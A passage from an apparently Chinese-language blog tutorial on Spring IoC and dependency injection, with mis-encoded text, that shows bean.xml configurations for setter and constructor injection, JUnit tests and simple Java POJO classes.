class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†å»å†™ bean.xml æ–‡ä»¶ï¼Œ<strong>é€šè¿‡ bean æ ‡ç­¾çš„ class å±æ€§æ¥å®šä½è¯¥ bean</strong>ï¼Œç„¶å bean æ ‡ç­¾å†…éƒ¨ä¹Ÿæ˜¯å¯ä»¥å†™ä¸œè¥¿çš„ï¼Œå°±æ¯”å¦‚è¯´å¯ä»¥è‡ªå®šä¹‰å±æ€§å€¼â€“é€šè¿‡ property æ ‡ç­¾å®ç°</p><p>é€šè¿‡ bean æ ‡ç­¾çš„ id æ¥æŒ‡å®šå®ä¾‹åŒ–ä¹‹åçš„å®ä½“å˜é‡å</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Hello&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Stoocea&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡æµ‹è¯•ç±»å»éªŒè¯ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.Hello;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHello</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        Hello hello= (Hello) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171145862.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171145862.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼š</p><ol><li>å½“æˆ‘ä»¬åœ¨ bean å·¥å‚æ³¨å†Œå®Œç±»ä¹‹åï¼Œè¯¥ç±»åº”è¯¥ä¼šåœ¨æ—æœ‰æ ‡è¯†</li><li>bean çš„å±æ€§å€¼è®¾ç½®æ˜¯é€šè¿‡ set æ–¹æ³•å»å®ç°çš„ï¼Œå¦‚æœè¯¥ç±»æ²¡æœ‰ set æ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯å½“å‰ç±»ä¸æ˜¯ bean ç±»çš„æ—¶å€™ï¼‰ä»–å°±æ— æ³•è¿›è¡Œå±æ€§è®¾ç½®ï¼Œåªèƒ½è·å–åˆ°è¯¥ç±»çš„å®ä¾‹åŒ–å¯¹è±¡</li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171158316.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171158316.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="0x02-IoC-åˆ›å»ºå¯¹è±¡"><a href="#0x02-IoC-åˆ›å»ºå¯¹è±¡" class="headerlink" title="0x02 IoC åˆ›å»ºå¯¹è±¡"></a>0x02 IoC åˆ›å»ºå¯¹è±¡</h3><p>ä¸Šé¢å·²ç»æ¼”ç¤ºè¿‡ä¸€ä¸ªé€šè¿‡ bean xml æ–‡ä»¶å»é…ç½®æ‰˜ç®¡å¯¹è±¡äº†ï¼Œä½†é‚£å…¶å®åªæ˜¯å…¶ä¸­ä¸€ç§æ–¹æ³•â€“é€šè¿‡æ— å‚æ„é€ å»å®ä¾‹åŒ–å¯¹è±¡ã€‚å¦‚æœè¦æœ‰å‚æ„é€ å¯¹è±¡ï¼Œé»˜è®¤çš„ IOC åˆ›å»ºå¯¹è±¡æœ‰å¦‚ä¸‹æ–¹å¼ï¼š</p><h4 id="1x01-é€šè¿‡ç´¢å¼•å»æœ‰å‚æ„é€ å¯¹è±¡"><a href="#1x01-é€šè¿‡ç´¢å¼•å»æœ‰å‚æ„é€ å¯¹è±¡" class="headerlink" title="1x01 é€šè¿‡ç´¢å¼•å»æœ‰å‚æ„é€ å¯¹è±¡"></a>1x01 é€šè¿‡ç´¢å¼•å»æœ‰å‚æ„é€ å¯¹è±¡</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">  https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Hello&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;stoocea&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸ªæµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.Hello;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHello</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        Hello hello= (Hello) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171211815.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171211815.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="1x02-é€šè¿‡å½¢å‚åå»æœ‰å‚æ„é€ å¯¹è±¡"><a href="#1x02-é€šè¿‡å½¢å‚åå»æœ‰å‚æ„é€ å¯¹è±¡" class="headerlink" title="1x02 é€šè¿‡å½¢å‚åå»æœ‰å‚æ„é€ å¯¹è±¡"></a>1x02 é€šè¿‡å½¢å‚åå»æœ‰å‚æ„é€ å¯¹è±¡</h4><p>åŠ¨çš„åªæ˜¯ beans.xml æ–‡ä»¶çš„å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Hello&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;stoocea&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1x03-é€šè¿‡å®šä½å½¢å‚çš„ç±»å‹å»æœ‰å‚æ„é€ "><a href="#1x03-é€šè¿‡å®šä½å½¢å‚çš„ç±»å‹å»æœ‰å‚æ„é€ " class="headerlink" title="1x03 é€šè¿‡å®šä½å½¢å‚çš„ç±»å‹å»æœ‰å‚æ„é€ "></a>1x03 é€šè¿‡å®šä½å½¢å‚çš„ç±»å‹å»æœ‰å‚æ„é€ </h4><p>è¿™ä¸ªä¸å¤ªæ¨èï¼Œå› ä¸ºå¦‚æœå‡ºç°ä¸¤ä¸ªå±æ€§å€¼çš„ç±»å‹ç›¸åŒå°±æ— æ³•å®šä½äº†</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Hello&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;stoocea&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å½¢å‚åå»å®ä¾‹åŒ–çš„æ—¶å€™æŠ¥äº†ä¸ª warningï¼Œä¸å½±å“æœ€ç»ˆç»“æœ</p><p>æœ€æ¨èçš„æ˜¯é€šè¿‡å½¢å‚å‚æ•°åå»èµ‹å€¼ï¼Œå› ä¸ºä¹‹åå¯èƒ½ä¼šæœ‰ç›´æ¥æ³¨å…¥å¯¹è±¡çš„æ“ä½œï¼Œå¯ä»¥æ›´å¥½çš„åŒºåˆ†</p><p>æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç‚¹ï¼Œæˆ‘ä»¬æ–°å†™ä¸€ä¸ª Pojo ç±»ï¼Œæœ‰å‚æ„é€ å’Œæ— å‚æ„é€ éƒ½æœ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserT</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String flag;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserT&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;flag=&#x27;&quot;</span> + flag + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFlag</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFlag</span><span class="params">(String flag)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserT</span><span class="params">(String flag)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserT</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†UserTçš„æ— å‚æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶å beans.xml æ–‡ä»¶è£…é…</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">  https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Hello&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;stoocea&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;UserT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.UserT&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç±»ä¸å˜ï¼Œä»…ä»…åªæ˜¯è·å– hello ç±»ï¼Œå¹¶ä¸”åªè°ƒç”¨ hello çš„æ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171227127.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171227127.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‘ç° UserT çš„æ— å‚æ„é€ ä¹Ÿè¢«è°ƒç”¨äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ç°åœ¨çš„ä¸Šä¸‹æ–‡ä¸­æ˜¯å­˜åœ¨ UserT çš„å®ä¾‹åŒ–å¯¹è±¡çš„ï¼ŒSpring åœ¨è·å– XML æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä¸”æ ¹æ®æ–‡ä»¶å†…å®¹è¿›è¡Œç±»å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œå°±å·²ç»æŠŠæ‰€æœ‰çš„æ³¨å†Œçš„ bean éƒ½æ— å‚å®ä¾‹åŒ–äº†ä¸€éï¼ˆé™¤äº†æŒ‡å®šæœ‰å‚æ„é€ çš„ bean ä»¥å¤–ï¼‰</p><h3 id="0x03-Spring-é…ç½®è¯´æ˜"><a href="#0x03-Spring-é…ç½®è¯´æ˜" class="headerlink" title="0x03 Spring é…ç½®è¯´æ˜"></a>0x03 Spring é…ç½®è¯´æ˜</h3><p>bean é…ç½®çš„è¯åªæœ‰å¦‚ä¸‹çš„å†…å®¹</p><p>bean beans alias description ä¸ç»†å†™ï¼Œç¨å¾®è¯´ä¸€ä¸‹ importï¼Œå®ƒåªæœ‰åœ¨å›¢é˜Ÿé¡¹ç›®ä¸­æ‰ä¼šç”¨åˆ°ï¼Œå› ä¸ºæœ‰å¯èƒ½è¦å¯¼å…¥å¤šä¸ª bean æ–‡ä»¶æ•´åˆï¼Œæ‰€ä»¥å¿…é¡»è¦æœ‰çš„å¯¼å…¥åŠŸèƒ½</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171238296.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171238296.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="4-DI-ï¼ˆä¾èµ–æ³¨å…¥ï¼‰"><a href="#4-DI-ï¼ˆä¾èµ–æ³¨å…¥ï¼‰" class="headerlink" title="4.DI ï¼ˆä¾èµ–æ³¨å…¥ï¼‰"></a>4.DI ï¼ˆä¾èµ–æ³¨å…¥ï¼‰</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171252221.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171252221.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¾èµ–æ³¨å…¥ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡æ„é€ å™¨æ³¨å…¥ï¼Œä¸€ç§æ˜¯é€šè¿‡ Setter æ³¨å…¥ï¼ˆå¦å¤–ä¸€ç§æ‰©å±•æ–¹å¼ä¼šæåˆ°ï¼‰</p><p>æ„é€ å™¨æ³¨å…¥åˆšæ‰ä¸Šé¢å·²ç»å­¦ä¹ è¿‡äº†ï¼Œå®šä½ 0x02-1x0ï¼Ÿç­‰å†…å®¹ï¼Œæ‰€ä»¥å¾…ä¼šé‡ç‚¹çœ‹ Setter æ³¨å…¥</p><p>ä½†æ˜¯åœ¨çœ‹ä¹‹å‰æˆ‘ä»¬è¿˜è¦è®°å½•å‡ ä¸ªé—®é¢˜ï¼š</p><p><strong>1.ä»€ä¹ˆæ˜¯ä¾èµ–</strong></p><p><strong>bean å¯¹è±¡çš„åˆ›å»ºä¾èµ–äºå®¹å™¨ï¼Œä¾èµ–æ³¨å…¥çš„æœ¬è´¨å°±æ˜¯ set æ³¨å…¥</strong></p><p><strong>2.æ³¨å…¥ä»€ä¹ˆï¼Œå¾€å“ªæ³¨å…¥</strong></p><p><strong>bean å¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§ï¼Œç”±å®¹å™¨æ¥æ³¨å…¥ï¼Œå…¶å®æ³¨å…¥çš„å¯¹è±¡å°±æ˜¯ beanï¼Œå…·ä½“åˆ° bean çš„æ¯ä¸€ä¸ªå±æ€§å€¼</strong></p><p>ä¸ºäº†å±•ç¤ºå…¨ DI çš„æ–¹å¼ï¼Œæˆ‘ä»¬è¦å…ˆåˆ›å»ºä¸€ä¸ªå®éªŒç¯å¢ƒ</p><h3 id="0x01-set-æ–¹å¼æ³¨å…¥"><a href="#0x01-set-æ–¹å¼æ³¨å…¥" class="headerlink" title="0x01 set æ–¹å¼æ³¨å…¥"></a>0x01 set æ–¹å¼æ³¨å…¥</h3><p>ç¬¬ä¸€ä¸ªå°±æ˜¯åˆ›å»ºä¸€ä¸ªå¤æ‚ bean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> String[] books;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbys;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; card;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br><span class="line"><span class="comment">//...get setç­‰æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Adress ä¹Ÿç»™ä»–å†™ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒæ­å»ºå¥½ä¹‹åå¯ä»¥å» bean æ–‡ä»¶è£…é…äº†</p><p>ç‰¹åˆ«çš„æ˜¯ map å’Œ propertiesï¼Œå½¢å¼å¯èƒ½ä¸å¤ªä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">        &lt;bean id=<span class="string">&quot;hello&quot;</span> 